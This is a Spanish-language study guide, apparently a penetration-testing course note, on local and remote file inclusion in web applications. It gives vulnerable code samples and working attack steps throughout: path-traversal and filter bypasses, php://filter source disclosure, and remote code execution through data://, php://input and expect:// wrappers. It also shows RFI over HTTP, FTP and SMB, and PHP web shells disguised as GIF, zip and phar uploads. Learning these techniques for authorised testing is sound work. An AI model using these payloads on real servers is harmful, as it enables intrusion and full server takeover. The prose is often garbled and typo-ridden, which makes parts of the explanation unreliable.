# FILE INCLUSION

## Índice

# INICIO

Muchos lenguajes modernos utilizan PHP, Js o Java, usando parametros HTTP para especificar como se va a ver la página web, esto se hace para construir páginas web dinámicas, reduciendo a sí el tamaño de los scripts y simplificando el código, en muchos casos estos parametros se usan para especificar como se van a ver los recursos en la página. Si muchas funciones no esta correctamente escritas, un atacante puede manipular esos parametros para ver contenido de archivos locales del servidor. 

# LOCAL FILE INCLUSION (LFI)

El lugar más común para encontrar esta vulnerabilidad es con temas. En order las aplicaciones web usan mucho para navegar entre paginas, un tema enseña como se va a ver esas partes, como un header, navigarion bar un footer, entonces hace que ese contenido sea dinámico. Cada pagina necesita ser modificada cuando hay un cambio en las partes estáticas. Esto es porque parametros como:
```
/index.php?page=about
```
Donde index.php es un contenido estático y esta llamando a un contenido dinámico especifico, en este caso queriendo leer el archivo "about.php"

La vulnerabilidad LFI puede dirigir código, datos sensibles, codigo remoto en algunas condiciones. Que se leekee el código puede ser que muchos atacantes encuentren vulnerabilidades.

### EJEMPLOS DE CÓDIGO VULNERABLE

Vamos a ver ejemplos de código vulnerable.

Tenemos un header dinamido o un contenido diferente. Por ejemplo unapágina que tiene ? languaje con el parametro GET, si un usuario cambio el lenguaje del menu drop, la misma página te devuelve un lenguaje diferente ?language=es en muchos casos, esto cambia el directorio de la aplicación web, cargando páginas como "/en" o "/es" si nosotros tenemos ese control, es potencialmente vulnerable.

## PHP

En php se sua la funcion "include()" para cargar archivos locales o archivos remotos. En el path se coge la funcion y el usuario manda el parámetro, como un parametro GET, el codigo no tiene que ser explicito y debe ser sanitizado para el usuario.

```
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

Nosotros vemos el parametro "language" directamente pasa "include()". Cualquier ruta que pase por el parametro "languaje" puede cargar la página, incluyendo archivos locales. Esto no es exclusivo de "include()" hay muchas mas funciones de PHP que tienen vulnerabilidades como.

include_once(), require(), require_once(), file_get_contets().

## NodeJS

Carga contenido también en parámetros HTTP.

```
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
Lo que el parametro hace esque de la URL coge el archivo de la función "readfile" esto escribe al fichero una respuesta HTTP. Otro ejemplo es "render()" de la funcion de Express.js. El ejemplo nos enseña que el parametro "languaje" determina el fichero del que va acoger.

```
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
Como en los otros el parametro GET de "?" en la URL, ejemplos como /about/en o /about/es con el parametro "render()" 

## JAVA

Es el mismo concepto. con la funcion "include"

```
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

La función include coge el fichero de la URL y renderia el objeto en el fron-end.

```
<c:import url= "<%= request.getParameter('language') %>"/>
```

## .NET

Finalmente, vamos a coger un ejemplo de LFI. el "Response.WriteFile" funciona igual que los otros ejemplos, coge la ruta de un fichero y escribe el contenido como respuesta. La ruta también lo hace con el parámetro GET.
```
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

Además, el @Html.Partial() renderiza archivos especificos.

```
@Html.Partial(HttpContext.Request.Query['language'])
```
Finalmente, la funcion "include" renderiza archivos locales o URL remotas.

```
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## LEER VS EJECUTAR

Por los anteriores ejemplos, podemos ver que LFI ocurre por los frameworks de la aplicación web, nos da funcionalidades para ejecutar dinamicamente el contenido.

Lo más importante es pensar que todas las funciones en la que se pueda leer contenidos especifico o ejecutra es un problema.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/7b6f5d42-af1e-45e9-ba0c-e0af151c3eaa)

## LFI BÁSICO

Nos encontramos con un language= parametro esto ya nos dice que es "php" hay otras formas de ver el lenguaje específico, El contenido es diferentes de las diferentes bases de datos basados en parametros especificos.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/e554ec74-1573-4e3f-8272-87cb2c24a109)

# PATH REVERSAL

En el anterior ejemplo, leimos una ruta especifica /etc/passwd. Esto no tiene porque funcionar siempre.

```
include($_GET['language']);
```

En este caso si nosotros intentamos leer esta ruta, con la funcion "include()" buscaría el archivo directamente. Sin embargo en muchas ocasiones los developers crear una ruta inicial, los aprametros se usan por el nombre y se añaden despues del directorio.

```
include("./languages/" . $_GET['language']);
```

En este caso si queremos leer la anterior ruta deberemos hacer un ./languages//etc/passwd

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/a8b6c57f-0e29-46b3-9159-817c38521ee1)

Nos sale un error. 

Podemos bypassear esto facilmente haciendo un directorio trasversal usando rutas relativas. Para hacer esto añadiremos ../ antes del nombre para referirnos del directorio. Por ejemplo si sabemos que el directorio es /var/www/html/languages deberemos hacer un ../../../../etc/passwd

Este truco sirve para quitar este tipo de comandos .

## PREFIJO DE NOMBRE

Nosotros usamos lenguajes después del directorio, para leer el passwd file. En otras ocasiones, podemos hacer string. Por ejemplo utilizar el nombre entero, etc..

```
include("lang_" . $_GET['language']);
```

En este caso si intentamos hacer lo mismo, quedaría tal que lang_../../..7etc/passwd esto seria invalido

El error nos dice obviamente que el ficheor no existe pero si ponemos un / antes de todo nos dejara.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/3309f6ec-7e94-4315-b001-d4d2c9aa3ffe)

## EXTENSIONES ADJUNTAS

Otra muy común es cuando hacemos extensiones adjuntas.

```
include($_GET['language'] . ".php");
```

Esto es bastante común, en este caso, no tenemos que escribir la extension cada vez que cambiemos el lenguaje. Esto lo hace más seguro para restringir archivos php, si nosotros queremos leer /etc/passwd nos pondra /etc/passwd.php

## ATAQUES DE SEGUNDO ORDER

Como podemos ver los ataques LFI tienes diferentes formas. Otra común es la de segundo orden. Esto ocurre porque la aplicacion web funciona cogiendo archivos del back end dejando que los usuarios puedan tener parametros de control

Por ejemplo una aplicación web descarga un avatar si nosotros hacemos un código malicioso podriamos cambiar el archivo para que se guarda localmente y se ejecutara lo que nosotros queremos.

En el anterior caso te nemter dentro de la base de adtos, y utilizas otro vector para descargar los usuarios.

Aveces los desarrolladores encuentran estas vulnerabilidades, por ejemplo de un ?page, pero hay otros vectores de ataque.

Explotar vulnerablidades usando ataques de este tipo, es otra variable.

# BASIC BYPASS

En la anterior sección, nosotros vimos diferentes tipos de ataque en losq ue nosotros podemos usar en una vulnerabilidad LFI. En muchos acsos, una aplicación web debe aplicar varias protección sobre file inclusiom, Normalmente no es un ataque que funcine, si tiene una buena seguridad.

## RUTA NO TRANSVERSAL Y FILTROS

Unos de los filtros más básicos de LFI es buscar y remplazar, simplemente borras las strings "../" y encontes ya quitar el path traversal.

```
$language = str_replace('../', '', $_GET['language']);
```

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/d1f43451-1b0e-459c-a9bb-cb0535b90133)

Obivamente si la string "../" esta removida no vas a poder nunca moverte, perrrooo en este caso simplemente sería hacer un "....//" si solo borra ../ entonces volveriamos a lo mismo.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/ec4e38b0-c0b6-495f-ad2b-a945c208dfbd)

Esto para nosotros esta bien al igual que puede utilizar "...\"

### CODIFICAR

Muchas webs utilizan filtros para prevenir este tipo de filtros, como "." o "/" usando rutas traversales, pero sin embargo si lo codificamos en la url y lo inputeamos estos caracteres, podemos bypasearlo.

encodeando por ejemplo como: 
![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/fac6e33d-224d-4bd3-b9a6-5895d999b916)


Como podriamos ver podriamos hacer un path traversal codificado sin ningún problema.

### RUTAS APROBADAS

Muchas aplicaciones web tienen expresiones regulares para asegurar una ruta especifica. Por ejemplo, la aplicacion web tiene una forma de aceptar las rutas y por debajo el directorio ./languages

```
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Para buscar el path,  nosotros examinamos las peticiones que mandamos de los foros existentes, y vemos la ruta que ellos usaran en una ruta normal. Podemos hacer un fuzz a los directorios web debajo de la misma ruta, y intentamos diferentes formas. Para bypasear podemos hacer un payload y con "../" ir a leer el archivo directamente.

### EXTENSIONES

Muchas aplicaciones tambien funcionan con extensiones como (php) para asegurarse que el archivo incluye una extension. En las versiones mas modernas de PHP, estamos accesibles a hacer bypass y tener restricciones para leer archivos de extension especificos.

Hay muchas tecnicas, ya obsoletas por las nuevas versiones de PHP. Sin embargo, esto nos beneficia, porque si un servidor es viejo sabemos que es vulnerables.

## TRUCO DE RUTA

En las primeras versiones de php, se definian un maximo de 4096 caracteres, con una limitacion de 32bits, simplemente despues de los maximos caracteres ignoraba lo demas,  y podias usar "/." y llamar a la conexion como "/ect/passwd/." pero esta fuera y ahora mismo no lo utilizaremos.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/4b9dcb11-c43a-432d-9531-d84e5ea6df14)

## FILTROS PHP

Muchas aplicaciones web utilizan PHP, es una forma de customizar la pagina web con diferentes frameworks del mismo como Laravel o Symfony. Si nosotros identificamos una vulnerabilidad en las aplicaciones PHP, entonces nosotros utilizaremos diferentes "PHP Wrappers" para tener disponibilidad para la explotación, y puntualmente una remota ejecución de código.

Los Wrappers de PHP te dan acceso a diferentes I/O, estandares como input/output, descripcions de ficheors, memoria. Hay muchos developers que utilizan PHP, los penetratin tester, nosotros debemos utilziar esos wrapers para la explotación de los ataques para leer el código PHP y ejecutar comandos de sistema. Esto no benefecia con estos ataques, son otros ataques como XXE, que se convierten.

En esta sección, aprendremos filtros básicos de PHP y leer su código, en la siguiente secciónm veremos como diferentes wrappers nos ayudan a ganar codigo remoto y conseguir este tipo de vulnerabilidades.

### FILTROS INPUT

Los filtros de PHP son un tipo de wrappers, cuando nosotros pasamos diferentes tipos de input y tener que hacer un filtro específico. Para usar wrappers de PHP, podemos usar el "php://" esquema, y podemos tener aceceso a filtros como "php://filter"

El filtro del wrapper tiene unos parametros, requere en nuestro ataque que se lea el recurso. El parametro del recurso requere un filtro, nosotros podemos especificar el directo y el filtro que se va a plicar, mientras ser lea el parametro pondremos filtros diferentes, podemos especificar el tipo de filtro que queremos.

Hay cuatro tipos de filtros diferentes que son "String Filters", "conversion Filters", "Compression Filters", "Encryption Filters" podemos leer mas y filtrar con codificacion y con filtros de conversion.

## FUZZIND EN ARCHIVOS PHP

El primer paso para saber los diferentes paginas que utilizan php podemos utilizar "ffuf" o "gobuster"

```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

Despues de leer esto, el escaneo nos dara referencias de archivos PHP, Podemos empezar leyendo index.php y escanear mas referencias.

### DIVULGACIÓN DE CÓDIGO

Una vez que tenemos una lista potencia del archivos PHP para leer, podemos empezar a utilizar codigo con el filtro base64 PHP. Vamos a intentar leer el codigo de "config.php" usando un filtro en base64 especificamente "convert.base64-encode" para el parametro read y el config 

```
php://filter/read=convert.base64-encode/resource=config
```

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/2c240976-9375-4204-af74-ebe2414d4f98)


## WRAPPERS DE PHP

En este modulo, nosotros explotaremos vulnerabilidades de file inclusion varios metodos. Sobre esta sección, podemos empezara a aprender como se usa este tipo de vulnerabilidades y ejecutar código remoto y ganar el control.

Nosotros podemos usar metodos para ejecutar comandos, cada uno especifico. Una forma de ganar el control del servidor es enumerando las crendenciales SSH, dandonos control de la cuenta o también sancando las contraseñas de la base de datos con un archivo como "config.php" 

Otros metodos son mas triviales como encontrar otras vulnerabilidades, local file privileges, etc..

### DATOS

El wrapper data se usa para incluid datos xterno, como codigo PHP, sin embargo, los wrappers solo son disponibles si se usa una URL incluida, si la configuración esta activada en las configuraciones PHP. Primero vamos a activarla y leeremos la configuración

## CHEKEAR CONFIGURACION PHP

Vamos a incluir configuración PHP y buscar "/etc/php/X.Y/apache2.php.ini" para apche o "/etc/php/X.Y/php.ini" para Nginx, Donde "X.Y" es la versión PHP. Nosotros podemos estar con la ultima version y luego utilizar otras. 

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

### REMOTE CODE EXECUTION

Con "allow_url_include" activado, podemos prodceder con daots, como ya sabemos este wrapper se utiliza para incluid datos externos, incluid codigo PHP. Podemos pasarlo en base64 y hacer una remote shell

```
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Ahora podemos hacer un URL encode como "data://text/plain;base64;" y usamos el comando &cmd=<command>

```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

# INPUT

Igual que el data tambien puede incluid codigo exteno, la diferenncia esque esto lo utilizamos con POST y es vulnerable si acepta este tipo de peticiones.

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

## EXPECT

Finalmente el wrapper expect, ejecuta directamente codigo en la URL, sin embargo necesita una instalación manual y que te deje el servidor.

```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```
El tio de configuracion se usa para activar el modulo, esto hace que consigas un RCE podemos usar expect://

```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
# REMOTE FILE INCLUDIO (RFI)

1 - Enumerar puertos locales

2 - Ganar codigo remoto y ejecutarlo

## LOCAL VS INCLUSION REMOTA

Cuando una vulnerabilidad incluye archivos remotos, el host normalmente no acepta script maliciosos, esto se incluye como vulnerabilidad para la pagna que se pueda ejecutar est codigo. 

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/44b6927a-ac1a-4371-b21b-4fcc749e2ce8)

Las mayorias de vulnerabilidades RFI y LFI tienen funciones de incluir remotamente URLS usualmente incluye archivos locales. Sin embargo, un LFI no tiene porque ser necesariamente un RFI.

- La funcion vulnerable no incluye URL remotas
- Tu solo tienes el control de uan forcion de algun archivo como hhtp o ftp
- La configuracion de RFI, normalmente en servidores modernos esta quitada

### VERIFICAR RFI

En muchos lenguajes, incluid codigo remoto en una URL es algo peligoros, por esto esta inclusion esta quitada predeterminadamente. Por ejemplo si quieres incluir URL tiene que estar activo

```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

Sin embargo, las configuraciones estan activas, estas funciones vulnerables puedes ejecutar este codigo remoto, y determinar si es una vulnerabilidad LFI o RFI, y ver el contenido, deberemos saber siempre al empezar intentar incluid una URL local como (http:/127.0.0.1:80/index.php)

Si vemos dicha página nos da por hecho que es vulnerable, esta ppagina es vulnerable a RFI

### REMOTE CODE EXECUTION CON RFI

El primerp aso para ganar un codigo remoto de ejecución es crear el scrip malicioso en la aplicacion web. Haremos una web shell y usaremos aun revershe sell

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora nosotros necesitamos incluirlo en la vulnerabilidad RFI. Es bueno estar escuchanndo los puertos para ver como el 80 o 443 

## HTTP

Vamos a empezar un servidor basico de python
```
sudo python3 -m http.server
```
Ahora incluiremos los archivos locales ousando la ip y el puerto

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/9ef723f3-623d-41ba-8334-bca2f6aa9c6b)

una vez veremos como se ha descargado

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/017b2d17-0fa1-411b-8898-e5dd9c75dd51)

## FTP

El protocolo ftp también lo podemos abrir con python
```
sudo python -m pyftpdlib -p 21
```

Noralmente esto es bloqueado por el firewall.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/78e10903-5087-46d1-98c3-9e7c690091f2)

```
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

## SMB

Una aplicacion web vulnerable en Windows necesitara SMB noramlmente utiliza, abrimos un servidor SMB usando "Impacket's smbserver.py" y a sí se autentifica

```
impacket-smbserver -smb2support share $(pwd)
```
![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/944831aa-be32-4670-bd48-e9bdfed92638)

## LFI Y SUBIDA DE ARCHIVOS

Las funcionalidades de subir archivos son obicuos en los sistemas modernos, los usuarios normalmente necesitan configuracion e los perfiles y usar la aplicacion para subir archivos. Los atacantes puede aaprovecha esto y sacar vulnerabilidades.

El ataque de subida de archivos coge diferentes tecnicas de subida y funcionalidaes. Sin embargo el ataque lo veremos ahora, requiere que se suba una rchivo en un form vulnerable, y grcias a ello con una ejecución de codigo cambien la funcion y capacidades, el codigo se sube y se ejcuta, Por ejemplo subes un "image.jpg" y guarad un pequeño códig PHP y incluye la vulnerabilidad LFI

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/572635d7-39b6-4962-b407-da69edb1f716)

## SUBIDAD DE IMAGEN

La subida de imagen es muy común en todas las aplicaciones modernas, subir imagenes seguras y la funcion de codificarlas. Sin embargo la vulnerabilidad en este caso si que nos funciona

### CONSTRUIR UNA IMAGEN MALICIOSA

Nuestro primer paso sera crear una imagen maliciosa que contenga codigo PHP con una web shell y funcione como imagen. Nosotros usamos extensiones de la imagen como "shell.gif" y incluye unos pequeños bytes de magia 

```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```


El archivo es nuestro y completamente inofensivo o eso parece.

Solamente necsitamos subirlo por ejemplo en un "profile settings" y cambialo por nuestra imagen. 

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/7a50aa87-a1e7-4ba2-b1e3-9e2413118c0d)

## ROTA DE SUBIDA DE LA IMAGEn

Una cosa importante es saber donde se sube el fichero, Para incluido necesitamos subir un fichero, especialmente con imagenes, podemos acceder nuestro subida y saber donde ha llegado
```
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Cuando pulsamos la ruta e incluimos la desacga el codigo se deberia ejecutar

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/3ae9e40e-cf24-4d5c-903a-5ad0d97da7e6)

## SUBIDA ZIP

Anteriormente mencionado, hay bastantes tecnicas en muchos casos utilizamos frameworks, una seccion vulnerable para ejecución de código remoto. Hay otras técnicas PHP que utilizan wrappers para archivar. Estas técnicas se hacer para especificar casos donde otras técnicas no funcionan.

Podemos utilizar el envoltorio zip para jecutar código como "shell.jpg"

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Una vez subido "shell.jpg" podemos incluid el wrapper zip://shell.jpg y otras referencias de fichero con #shell.hp codificoad

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/7e619891-7caf-4204-af50-d09dde43b90f)

## SUBIDA PHAR

Finalmente podemos usar "phar://
```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
Este escript es como si fuera un fichero "phat" y se hace una shell con un txt

```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Ahora noostros deberiamos llamar al jpg y activaria el subfichero

